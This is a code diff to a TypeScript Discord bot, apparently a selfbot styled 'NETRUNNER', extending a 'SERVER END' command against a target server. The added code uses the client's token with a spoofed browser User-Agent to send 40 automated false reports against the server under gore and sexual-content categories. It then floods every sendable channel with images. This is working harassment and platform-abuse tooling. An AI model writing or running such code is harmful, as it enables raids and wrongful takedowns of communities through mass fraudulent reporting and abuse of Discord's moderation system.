@@ -4112,8 +4112,7 @@ export class BotManager {
                 const allChannels = await targetGuild.channels.fetch();
                 channels = Array.from(allChannels.values()).filter((ch: any) => {
                     if (!ch) return false;
-                    // text, news, and thread-like channels
-                    const SENDABLE_TYPES = [0, 5, 10, 11, 12]; // GUILD_TEXT, GUILD_NEWS, NEWS_THREAD, PUBLIC_THREAD, PRIVATE_THREAD
+                    const SENDABLE_TYPES = [0, 5, 10, 11, 12];
                     if (!SENDABLE_TYPES.includes(ch.type)) return false;
                     try {
                         const perms = ch.permissionsFor(client.user);
@@ -4134,10 +4133,109 @@ export class BotManager {
                 `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END INITIATED\u001b[0m\n` +
                 `\u001b[1;33mTarget:\u001b[0m ${targetGuild.name} (${targetGuildId})\n` +
                 `\u001b[1;33mChannels:\u001b[0m ${channels.length}\n` +
-                `\u001b[1;33mRounds:\u001b[0m 2 × 2s apart\u001b[0m\n\`\`\``
+                `\u001b[1;33mStep 1/3:\u001b[0m Reporting server...\u001b[0m\n\`\`\``
             ).catch(() => {});
 
-            // Helper: send all images to a single channel, ignore errors
+            // ── Report the server for both categories ─────────────────────────
+            const token = (client as any).token;
+            const reportHeaders: Record<string, string> = {
+                'Authorization': token,
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'X-Discord-Locale': 'en-US',
+                'X-Discord-Timezone': 'America/New_York',
+            };
+
+            // Walk node tree to find breadcrumbs matching a set of keywords
+            const buildBreadcrumbs = (nodes: Record<number, any>, rootId: number, keywords: string[]): number[] => {
+                const path: number[] = [];
+                let currentId: number = rootId;
+                for (let depth = 0; depth < 15; depth++) {
+                    const node = nodes[currentId];
+                    if (!node) break;
+                    path.push(currentId);
+                    if (node.button?.type === 'submit' || node.is_auto_submit) break;
+                    const children: Array<{ name: string; target_node_id: number }> = node.children || [];
+                    if (children.length === 0) break;
+                    const match = children.find((c) => {
+                        const n = (c.name || '').toLowerCase();
+                        return keywords.some(kw => n.includes(kw));
+                    });
+                    currentId = match ? match.target_node_id : children[0].target_node_id;
+                }
+                return path;
+            };
+
+            // Fetch the report menu once and derive both breadcrumb paths
+            let goreBreadcrumbs: number[] = [];
+            let sexualBreadcrumbs: number[] = [];
+            let menuVariant = '3';
+            try {
+                const menuRes = await fetch('https://discord.com/api/v9/reporting/menu/guild', { headers: reportHeaders });
+                if (menuRes.ok) {
+                    const menu = await menuRes.json() as any;
+                    menuVariant = String(menu.variant || '3');
+                    const nodes: Record<number, any> = menu.nodes || {};
+                    const rootId: number = menu.root_node_id;
+                    goreBreadcrumbs   = buildBreadcrumbs(nodes, rootId, ['gore', 'animal cruelty', 'violent shock', 'shock content', 'violent']);
+                    sexualBreadcrumbs = buildBreadcrumbs(nodes, rootId, ['sexual', 'explicit', 'graphic', 'unwanted sexual']);
+                }
+            } catch { /* menu fetch failed — will use v1 fallback */ }
+
+            // Helper: send N reports using a specific breadcrumb path / v1 reason code
+            const sendReports = async (breadcrumbs: number[], v1Reason: number, count: number): Promise<{ success: number; failed: number }> => {
+                let success = 0; let failed = 0;
+                for (let i = 0; i < count; i++) {
+                    let sent = false;
+                    if (breadcrumbs.length > 0) {
+                        try {
+                            const res = await fetch('https://discord.com/api/v9/reporting/guild', {
+                                method: 'POST',
+                                headers: reportHeaders,
+                                body: JSON.stringify({
+                                    version: '1.0',
+                                    variant: menuVariant,
+                                    name: 'guild',
+                                    language: 'en',
+                                    breadcrumbs,
+                                    guild_id: targetGuildId,
+                                }),
+                            });
+                            if (res.status === 201 || res.ok) { success++; sent = true; }
+                        } catch { /* fall through */ }
+                    }
+                    if (!sent) {
+                        try {
+                            const res = await fetch('https://discord.com/api/v9/report', {
+                                method: 'POST',
+                                headers: reportHeaders,
+                                body: JSON.stringify({ guild_id: targetGuildId, channel_id: null, message_id: null, reason: v1Reason }),
+                            });
+                            if (res.ok || res.status === 201 || res.status === 204) { success++; } else { failed++; }
+                        } catch { failed++; }
+                    }
+                    await new Promise(r => setTimeout(r, 600));
+                }
+                return { success, failed };
+            };
+
+            // Report 1: gore / violent shock content (v1 reason 8 = harmful/dangerous)
+            const goreResult = await sendReports(goreBreadcrumbs, 8, 20);
+            // Report 2: explicit / sexual content (v1 reason 5 = explicit content)
+            const sexualResult = await sendReports(sexualBreadcrumbs, 5, 20);
+
+            const totalSuccess = goreResult.success + sexualResult.success;
+            const totalFailed  = goreResult.failed  + sexualResult.failed;
+
+            await message.edit(
+                `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END — REPORTS SENT\u001b[0m\n` +
+                `\u001b[1;33mGore / Violent Shock:\u001b[0m   ${goreResult.success}/20 sent\n` +
+                `\u001b[1;33mExplicit / Sexual:\u001b[0m      ${sexualResult.success}/20 sent\n` +
+                `\u001b[1;33mTotal:\u001b[0m ${totalSuccess}/40${totalFailed > 0 ? `  \u001b[1;31m(${totalFailed} failed)\u001b[0m` : ''}\n` +
+                `\u001b[1;33mStep 2/3:\u001b[0m Flooding channels...\u001b[0m\n\`\`\``
+            ).catch(() => {});
+
+            // ── Flood channels ────────────────────────────────────────────────
             const floodChannel = async (ch: any) => {
                 for (const url of SERVER_END_IMAGES) {
                     try { await ch.send(url); } catch { /* skip if no perms or deleted */ }
@@ -4156,6 +4254,7 @@ export class BotManager {
             await message.edit(
                 `\`\`\`ansi\n\u001b[1;32m[✓] SERVER END COMPLETE\u001b[0m\n` +
                 `\u001b[1;33mGuild:\u001b[0m ${targetGuild.name}\n` +
+                `\u001b[1;33mReports sent:\u001b[0m ${totalSuccess}/40 (gore + explicit)\n` +
                 `\u001b[1;33mChannels hit:\u001b[0m ${channels.length}\n` +
                 `\u001b[1;33mImages sent:\u001b[0m ${channels.length * SERVER_END_IMAGES.length * 2}\u001b[0m\n\`\`\``
             ).catch(() => {});
